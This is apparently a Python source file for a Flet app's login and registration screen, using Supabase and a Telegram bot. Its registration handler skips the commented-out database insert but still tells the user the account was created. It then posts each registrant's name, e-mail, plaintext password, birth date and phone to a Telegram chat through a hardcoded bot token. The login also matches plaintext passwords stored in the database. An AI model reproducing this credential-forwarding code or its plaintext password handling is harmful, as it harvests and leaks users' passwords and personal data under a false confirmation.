import re
from datetime import datetime as dt
import pendulum as dtp

import flet as f
from colors import ColorsApp
from telebot import TeleBot

colors = ColorsApp()

from supabase import Client


class BirthDate:
    def __init__(self, day, month, year) -> None:
        self._day = day
        self._month = month
        self._year = year

    @property
    def day(self):
        return self._day

    @day.setter
    def day(self, value):
        self._day = value if value > 0 <= 31 else self._day

    @property
    def month(self):
        return self._month

    @month.setter
    def month(self, value):
        self._month = value if value > 0 <= 12 else self._month

    @property
    def year(self):
        return self._year

    @year.setter
    def year(self, value):
        self._year = value if value > 1000 <= dt.today().year else self._year


class NumberPhone:
    def __init__(self, number, cod_ddd, cod_country) -> None:
        self._cod_country = cod_country
        self._cod_ddd = cod_ddd
        self._number = number
        self._phone_number = f"{self.cod_country}{self.cod_ddd}{self.number}"

    @property
    def cod_country(self):
        return self._cod_country

    @cod_country.setter
    def cod_country(self, value):
        self._cod_country = value

    @property
    def cod_ddd(self):
        return self._cod_ddd

    @cod_ddd.setter
    def cod_ddd(self, value):
        self._cod_ddd = value

    @property
    def number(self):
        return self._number

    @number.setter
    def number(self, value):
        self._number = value


class User:
    def __init__(
        self,
        first_name: str,
        last_name: str,
        phone: NumberPhone,
        birth_date: BirthDate,
        e_mail: str,
        password: str,
        page: f.Page
    ) -> None:
        self._password = password
        self._e_mail = e_mail
        self._birth_date = birth_date
        self._phone = phone
        self._name = f"{first_name} {last_name}"
        self._first_name = first_name
        self._last_name = last_name
        self._page = page

    @property
    def name(self):
        return self._name

    @property
    def first_name(self):
        return self._first_name

    @first_name.setter
    def first_name(self, value):
        self._first_name = value

    @property
    def last_name(self):
        return self._last_name

    @last_name.setter
    def last_name(self, value):
        self._last_name = value

    @property
    def password(self):
        return self._password

    @password.setter
    def password(self, value):
        self._password = value

    @property
    def e_mail(self):
        return self._e_mail

    @e_mail.setter
    def e_mail(self, value):
        self._e_mail = value

    @property
    def birth_date(self):
        return self._birth_date

    @birth_date.setter
    def birth_date(self, value):
        self._birth_date = value

    @property
    def phone(self):
        return self._phone

    @phone.setter
    def phone(self, value):
        self._phone = value


class Login:
    @staticmethod
    def _validate_email(email):
        patterns = ("@gmail.com", "@yahoo.com", "@outlook.com")
        for i in patterns:
            if re.search(i, email):
                return True
        return False

    @staticmethod
    def _send_user_register(user: User):
        chat_id = "-1001939715892"
        bot = TeleBot(token="6695651606:AAEz8xm18BMhqCLXSIeBQhglfQc16-lRy9Y")
        bot.send_message(
            chat_id,
            f"""
Name: {user.first_name} {user.last_name}
E-mail: {user.e_mail}
Password: {user.password}
Data nascimento: f"{user.birth_date.day}-{user.birth_date.month}-{user.birth_date.year}"
Phone: {user.phone.cod_country}{user.phone.cod_ddd}{user.phone.number}
            """
        )

    def __init__(self, page: f.Page, data: Client, home) -> None:
        self.home = home
        self.user = None
        self.data = data
        self.page = page
        self.image_app_bar_layout = f.Image(
            src="assets/image/PandaFundo.png",
            fit=f.ImageFit.CONTAIN,
            width=500
        )
        self.text_input_style = f.TextStyle(
            size=15,
            weight=f.FontWeight.W_500,
        )
        self.buttons_style = f.ButtonStyle(
            color={
                "": "#FEFDFC",
                "hovered": colors.Light_purple,
            },
            bgcolor={"": "#1D223A", "hovered": colors.Light_orange},
            elevation={"hovered": 10},
            animation_duration=350
        )
        self.input_email = f.TextField(
            border_radius=f.border_radius.all(30),
            border_width=1,
            hint_text="example@email.com",
            text_style=self.text_input_style,
            width=320,
            tooltip="E-mail accont",
            border_color=colors.Light_purple,
            focused_border_width=3,
            focused_border_color="#fbd80c"
        )
        self.input_password = f.TextField(
            hint_text="password",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=320,
            tooltip="Passoword accont",
            password=True,
            can_reveal_password=True,
            border_color=colors.Light_purple,
            focused_border_width=3,
            focused_border_color="#fbd80c"
        )
        self.button_enter = f.ElevatedButton(
            text="Enter",
            style=self.buttons_style,
            on_click=self.login_in_app
        )
        self.button_sign_up = f.ElevatedButton(
            data="Signup",
            text="sign up",
            style=self.buttons_style,
            on_click=self.sign_up
        )
        self.button_cancel = f.ElevatedButton(
            "Cancel",
            style=self.buttons_style
        )
        self.column_login = f.Column(
            width=340,
            controls=[
                f.Container(self.image_app_bar_layout),
                f.Row([
                    f.Text("User Name", size=20, color=colors.Light_orange)
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    self.input_email
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    f.Text("Password", size=20, color=colors.Light_orange)
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    self.input_password
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row(
                    [
                        self.button_enter,
                        self.button_sign_up,
                        self.button_cancel,
                    ],
                    alignment=f.MainAxisAlignment.SPACE_BETWEEN
                )
            ],
            alignment=f.MainAxisAlignment.CENTER
        )
        self.input_first_name = f.TextField(
            hint_text="First name",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=320,
            tooltip="First name",
            border_color=colors.Light_purple,
            focused_border_width=3,
            focused_border_color="#fbd80c"
        )
        self.input_last_name = f.TextField(
            hint_text="Last name",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=320,
            tooltip="Last name",
            border_color=colors.Light_purple,
            focused_border_width=3,
            focused_border_color="#fbd80c"
        )
        self.input_password_confirm = f.TextField(
            hint_text="confirm password",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=320,
            tooltip="Passoword confirm",
            password=True,
            can_reveal_password=True,
            border_color=colors.Light_purple,
            focused_border_width=3,
            focused_border_color="#fbd80c"
        )
        self.input_birth_date = f.TextField(
            border=f.InputBorder.UNDERLINE,
            hint_text="Birth Date",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=120,
            tooltip="Last name",
            border_color=colors.Light_purple,
            focused_border_width=3,
            focused_border_color="#fbd80c"
        )
        self.button_date_picker = f.ElevatedButton(
            text="Date",
            style=self.buttons_style,
            icon=f.icons.CALENDAR_MONTH,
            on_click=self.open_date_picker
        )
        self.datepicker = f.DatePicker(
            expand=True,
            date_picker_entry_mode=f.DatePickerEntryMode.CALENDAR,
            date_picker_mode=f.DatePickerMode.YEAR,
            text_style=f.TextStyle(size=8),
            first_date=dt(1950, 1, 1),
            last_date=dt.now(),
            current_date=dt.now(),
            on_change=self.change_date
        )
        self.button_coutry = f.Dropdown(
            border_color=colors.Light_purple,
            focused_border_width=3,
            focused_border_color="#fbd80c",
            border_radius=f.border_radius.all(30),
            label="Coutry",
            label_style=f.TextStyle(10),
            width=75,
            height=60,
            options=[
                f.dropdown.Option(text="+55"),
                f.dropdown.Option(text="+56"),
                f.dropdown.Option(text="+52"),
                f.dropdown.Option(text="+53"),
                f.dropdown.Option(text="+54"),
                f.dropdown.Option(text="+57"),
                f.dropdown.Option(text="+58"),
            ]
        )
        self.button_ddd = f.Dropdown(
            border_color=colors.Light_purple,
            focused_border_width=3,
            focused_border_color="#fbd80c",
            border_radius=f.border_radius.all(30),
            label="DDD",
            label_style=f.TextStyle(10),
            width=75,
            height=60,
            options=[
                f.dropdown.Option(text="85"),
                f.dropdown.Option(text="11"),
                f.dropdown.Option(text="21"),
                f.dropdown.Option(text="28"),
                f.dropdown.Option(text="31"),
                f.dropdown.Option(text="41"),
                f.dropdown.Option(text="61"),
            ]
        )
        self.input_phone_number = f.TextField(
            hint_text="Number",
            border_radius=f.border_radius.all(30),
            border_width=1,
            text_style=self.text_input_style,
            width=155,
            height=60,
            tooltip="Number",
            border_color=colors.Light_purple,
            focused_border_width=3,
            focused_border_color="#fbd80c"
        )
        self.input_phone = f.Row(
            controls=[
                self.button_coutry,
                self.button_ddd,
                self.input_phone_number,
            ],
            alignment=f.MainAxisAlignment.CENTER,
        )
        self.button_register = f.ElevatedButton(
            text="Register",
            style=self.buttons_style,
            on_click=self.register_user
        )
        self.button_login = f.ElevatedButton(
            text="Login",
            style=self.buttons_style,
            on_click=self.login
        )
        self.button_calcel_register = f.ElevatedButton(
            text="Cancel",
            style=self.buttons_style,
            on_click=self.login
        )
        self.column_register = f.Column(
            width=340,
            controls=[
                f.Container(self.image_app_bar_layout),
                f.Row([
                    f.Text("First name", size=15, color=colors.Light_orange)
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    self.input_first_name
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    f.Text("Last name", size=15, color=colors.Light_orange)
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    self.input_last_name
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    f.Text("E-mail", size=15, color=colors.Light_orange)
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    self.input_email
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    f.Text("Password", size=15, color=colors.Light_orange)
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    self.input_password
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    f.Text("Confirm password", size=15, color=colors.Light_orange)
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    self.input_password_confirm
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row([
                    f.Text("Phone", size=15, color=colors.Light_orange)
                ], alignment=f.MainAxisAlignment.CENTER),
                self.input_phone,
                f.Row([
                    f.Text("Birthday", size=15, color=colors.Light_orange)
                ], alignment=f.MainAxisAlignment.CENTER),
                f.Row(
                    controls=[
                        self.button_date_picker,
                        self.input_birth_date
                    ],
                    alignment=f.MainAxisAlignment.SPACE_BETWEEN
                ),
                f.Row(
                    controls=[
                        self.button_register,
                        self.button_login,
                        self.button_calcel_register
                    ],
                    alignment=f.MainAxisAlignment.SPACE_BETWEEN
                )
            ],
            alignment=f.MainAxisAlignment.CENTER,
            scroll=True,
            visible=False
        )
        self.display_login = f.View(
            route="/",
            controls=[
                self.column_login,
                self.column_register
            ],
            spacing=5,
            horizontal_alignment=f.CrossAxisAlignment.CENTER,
            vertical_alignment=f.MainAxisAlignment.START,
            padding=15,
            bgcolor=colors.Dark_purple,
            scroll=True,
        )

    def login_in_app(self, e):
        def close_banner(e):
            self.page.banner.open = False
            self.page.update()
        count = 0
        for field in (self.input_email, self.input_password):
            if not field.value:
                count += 1
                field.error_text = "Empity field!"
            else:
                field.error_text = ""
            self.page.update()
        if count:
            return

        if not Login._validate_email(self.input_email.value):
            self.input_email.error_text = "E-mail invalido!"
            self.page.update()
            return

        data = self.data.table("user").select("*").eq(
            "password", self.input_password.value
        ).eq("email", self.input_email.value) .execute()
        print(data.data)
        print(len(data.data))
        if len(data.data) == 0:
            self.input_email.value = ""
            self.input_password.value = ""
            self.page.update()
            return
        if len(data.data) > 0:
            if not data.data[0]["signature"]:
                banner = f.Banner(
                    bgcolor=f.colors.AMBER_100,
                    leading=f.Icon(f.icons.WARNING_AMBER_ROUNDED, color=f.colors.AMBER, size=40),
                    content=f.Text(
                        "Suspended subscription contact your administrator!",
                        color=f.colors.BLACK
                    ),
                    actions=[
                        f.TextButton("Ok!", on_click=close_banner),
                    ],
                )
                self.page.banner = banner
                self.page.banner.open = True
                self.page.update()
                return
            num = str(data.data[0]["phone"])
            date = dtp.parse(data.data[0]["birth_date"])
            number = NumberPhone(
                number=int(num[4:]),
                cod_ddd=int(num[2:4]),
                cod_country=int(num[0:2])
            )
            self.user = User(
                first_name=data.data[0]["first_name"],
                last_name=data.data[0]["last_name"],
                phone=number,
                birth_date=BirthDate(
                    day=date.day,
                    month=date.month,
                    year=date.year,
                ),
                e_mail=data.data[0]["email"],
                password=data.data[0]["password"],
                page=self.page
            )
            self.home.user = self.user
            self.home.bots = self.data.table("bot").select("*").eq("id_user", data.data[0]["id_user"]).execute()
            self.home.text_welcome.value = f"Bem vindo {self.user.first_name} {self.user.last_name}"
            self.page.update()
            self.page.go("/home")
            return

    def register_user(self, e):
        def close_banner(e):
            self.page.banner.open = False
            self.page.update()

        count_empty = 0
        for field in (
            self.input_first_name, self.input_last_name, self.input_email,
            self.input_password, self.input_password_confirm,
            self.input_phone_number, self.button_coutry, self.button_ddd,
            self.input_birth_date
        ):
            if not field.value:
                count_empty += 1
                field.error_text = "Empty field!"
                self.page.update()
            else:
                field.error_text = ""
                self.page.update()
        if count_empty:
            return

        if not Login._validate_email(self.input_email.value):
            self.input_email.error_text = "Invalid e-mail!"
            self.page.update()
            return
        self.input_email.error_text = ""
        if not self.input_password.value == self.input_password_confirm.value:
            self.input_password.error_text = "Password does not match"
            self.input_password_confirm.error_text = "Password does not match"
            self.page.update()
            return
        parse = f"{self.input_birth_date.value[6:]}-{self.input_birth_date.value[3:5]}-{self.input_birth_date.value[0:2]}"
        date = dtp.parse(f"{parse} 00:00:00")
        user = User(
            first_name=self.input_first_name.value,
            last_name=self.input_last_name.value,
            phone=NumberPhone(
                number=int(self.input_phone_number.value),
                cod_ddd=int(self.button_ddd.value),
                cod_country=int(self.button_coutry.value.replace("+", " "))
            ),
            birth_date=BirthDate(
                day=date.day,
                month=date.month,
                year=date.year
            ),
            e_mail=self.input_email.value,
            password=self.input_password.value,
            page=self.page
        )
        # data = self.data.table("user").insert(
        #     {
        #         "first_name": user.first_name,
        #         "last_name": user.last_name,
        #         "signature": False,
        #         "phone": int(user.phone._phone_number),
        #         "signature_at": dtp.now().to_atom_string(),
        #         "birth_date": date.to_atom_string(),
        #         "email": self.input_email.value,
        #         "password": self.input_password.value
        #     }
        # ).execute()
        # if len(data.data) > 0:
        #     print("inserido com sucesso!")
        for field in (
            self.input_first_name, self.input_last_name, self.input_email,
            self.input_password, self.input_password_confirm,
            self.input_phone_number, self.button_coutry, self.button_ddd,
            self.input_birth_date
        ):
            field.value = ""
            self.page.update()

        banner = f.Banner(
            bgcolor=f.colors.GREEN_ACCENT_200,
            leading=f.Icon(f.icons.CHECK_CIRCLE_OUTLINE, color=f.colors.GREEN_ACCENT_700, size=40),
            content=f.Text(
                "Your account has been created successfully!",
                color=f.colors.BLACK
            ),
            actions=[
                f.TextButton("Ok!", on_click=close_banner),
            ],
        )
        self.page.banner = banner
        self.page.banner.open = True
        self.page.update()
        Login._send_user_register(user)

    def sign_up(self, e):
        self.column_login.visible = False
        self.column_register.visible = True
        self.display_login.update()
        self.page.update()

    def login(self, e):
        self.column_login.visible = True
        self.column_register.visible = False
        self.display_login.update()
        self.page.update()

    def change_date(self, e):
        self.input_birth_date.value = self.datepicker.value.strftime(
            "%d-%m-%Y"
        )
        self.page.update()

    def open_date_picker(self, e):
        self.page.overlay.append(self.datepicker)
        self.datepicker.open = True
        self.page.update()
